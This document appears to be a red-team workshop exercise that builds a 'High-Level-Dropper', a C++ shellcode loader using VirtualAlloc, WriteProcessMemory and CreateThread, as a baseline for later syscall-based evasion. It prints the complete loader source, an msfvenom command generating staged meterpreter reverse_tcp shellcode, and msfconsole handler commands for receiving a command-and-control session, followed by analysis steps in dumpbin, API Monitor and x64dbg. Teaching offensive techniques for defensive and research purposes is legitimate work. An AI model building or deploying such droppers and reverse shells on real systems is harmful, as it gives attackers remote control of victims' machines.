## Exercise 2: High Level Dropper
In **Exercise 1** we will create our first shellcode dropper based on **high level APIs** or **Win32 APIs**. This dropper will more or less be the reference for further development into a direct syscall and indirect syscall dropper. Later in this text we call the Dropper High-Level-Dropper. If you look at the figure below, you will see that we do not use direct or indirect syscalls at all. Instead we use the normal legitimate way like ``malware.exe -> Win32 APIs (kernel32.dll) -> Native APIs (ntdll.dll) -> syscall``.  
![_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235367776-54229a66-f1d6-4b8e-a2a2-7bb81fecbf48.png)


## Exercise 2 tasks:
### Create High-Level-Dropper
1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the High-Level-Dropper.
2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ High-Level-Dropper POC. 
3. Compile the High-Level-Dropper as release or debug x64. 
4. Create and run a staged x64 meterpreter listener with msfconsole.
5. Run your compiled .exe and verify that a stable command and control channel opens. 
### Analyse High-Level-Dropper
6. Use the Visual Studio tool **dumpbin** to analyze the compiled High-Level-Dropper. Is the result what you expected?  
7. Use the tool **API Monitor** to analyze the compiled High-Level-Dropper in the context of the four APIs used. Is the result what you expected? 
8. Use the debugger **x64dbg** to analyze the compiled High-Level-Dropper: from which module and location are the syscalls from the four APIs used being executed? Is the result what you expected?


## Visual Studio 
The POC can be created as a new C++ project (Console Application) in Visual Studio by following the steps below. 
<details>
<p align="center">
<img width="652" alt="image" src="https://user-images.githubusercontent.com/50073731/235356344-c14f9123-751c-462c-a610-50c7156f93f9.png">
</p>

The easiest way is to create a new console app project and then replace the default hello world text in main.cpp with your code. 

<p align="center">
<img width="640" alt="image" src="https://user-images.githubusercontent.com/50073731/235357092-5fd2e873-6732-4b37-a69d-38a281953b2e.png">
<img width="645" alt="image" src="https://user-images.githubusercontent.com/50073731/235357228-940ec56c-7565-44b8-8b6a-01a74ab15e1d.png">
</p>
</details>


The technical functionality of the High-Level-Dropper is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the High-Level-Dropper into a low-level dropper using direct system calls. In the High-Level-Dropper we use the following Windows APIs: 
- VirtualAlloc
- WriteProcessMemory
- CreateThread
- WaitForSingleObject

The code works like this. First, we need to define the thread function for shellcode execution later in the code.
<details>
    
```
// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}
```
 </details> 
 
 
Within the main function, the variable **code** is defined, which is responsible for storing the meterpreter shellcode. The content of "code" is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.
<details>
    
```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
</details>

    
The next code block defines the function pointer **void***, which points to the variable **exec** and stores the return address of the allocated memory using the Windows API VirtualAlloc.
<details>
    
```
// Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
 </details>   


The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.
<details>

```
// Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
```
</details>
    

Next, the Windows API **CreateThread** is used to execute the meterpreter shellcode. This is done by creating a new thread.<p align="center">
<details>
    
```
// Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); 
```
</details>

    
And by using the Windows API **WaitForSingleObject** we need to make sure that the shellcode thread completes its execution before the main thread exits.
<details>  
    
```
// Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);    
```
</details>    

    
Here is the **complete code**, and you can copy and paste this code into your **High-Level-Dropper** project in Visual Studio.
You can also download the complete **High-Level-Dropper Visual Studio project** in the **Code Example section** of this repository.
<details>
    
```
#include <stdio.h>
#include <windows.h>

// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}

int main() {
    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);

    // Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);

    // Return 0 as the main function exit code
    return 0;
}
```
</details>

    
## Meterpreter Shellcode
In this step, we will create our meterpreter shellcode for the High-Level-Dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
**kali>**       
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>
    
The shellcode can then be copied into the High-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>
    

## MSF-Listener
Before we test the functionality of our High-Level-Dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 
<details>
    
<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>


## High-Level-Dropper analysis: dumpbin
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
<details>
    
**cmd>**  
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```
</details>
    
<details>
    <summary>Solution</summary>   
In the case of the High-Level-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the High-Level-Dropper from the kernel32.dll.
<p align="center">
<img width="693" alt="image" src="https://user-images.githubusercontent.com/50073731/235369396-dbad1178-e9a2-4c55-8c6a-fdc9362d864c.png">
</p>
</details>

    
## High-Level-Dropper analysis: API-Monitor
We use API Monitor to check the transition from the four used Windows APIs to the four corresponding native APIs.
For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and corresponding native APIs, which can prove the transition from Windows APIs (kernel32.dll) to native APIs (ntdll.dll), in the context of the High-Level-Dropper, we filter on the following API calls. Which results do you expect?
- VirtualAlloc
- NtAllocateVirtualMemory
- WriteProcessMemory
- NtWriteVirtualMemory
- CreateThread
- NtCreateThreadEx
- WaitForSingleObject
- NtWaitForSingleObject



<details>
    <summary>Solution</summary> 
If everything was done correctly, you should see clean transitions from the Windows APIs used to the native APIs we used in our High-Level-Dropper POC.
<p align="center">
<img width="498" alt="image" src="https://user-images.githubusercontent.com/50073731/235368737-9f87f5de-0a7e-4039-b454-2af23914b277.png">
</p>
</details>

    
## High-Level-Dropper analysis: x64dbg 
Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
Remember, so far we have not implemented any native APIs or system calls or system call stubs directly in the dropper. What results would you expect?
<details>
    <summary>Solution</summary>
    
1. Open or load your High-Level-Dropper.exe into x64dbg
2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight **ntdll.dll**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. 
    
<p align="center">    
<img width="867" alt="image" src="https://user-images.githubusercontent.com/50073731/235445644-240e5c3b-a3cf-4a7a-99be-27412e2dcb82.png">
</p>
    
As expected, we can observe that the corresponding system calls for the native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject are correctly executed/imported from the .text section in the ntdll.dll module. This investigation is very important because later in the direct syscall exercise we expect a different result with the low level dropper and want to match it.
    
<p align="center">    
<img width="686" alt="image" src="https://user-images.githubusercontent.com/50073731/235445865-c3fe83fa-1539-4ff3-b850-96cc91a0a01d.png">
</p>    
</details>

    
## Summary: High-level API Dropper
- No direct system calls at all
- Syscall execution over normal transition from high_level_dropper.exe -> kernel32.dll -> ntdll.dll -> syscall
- Dropper imports VirtualAlloc from kernel32.dll...
- ...then imports NtAllocateVirtualMemory from ntdll.dll...
- ...and finally executes the corresponding syscall or syscall stub
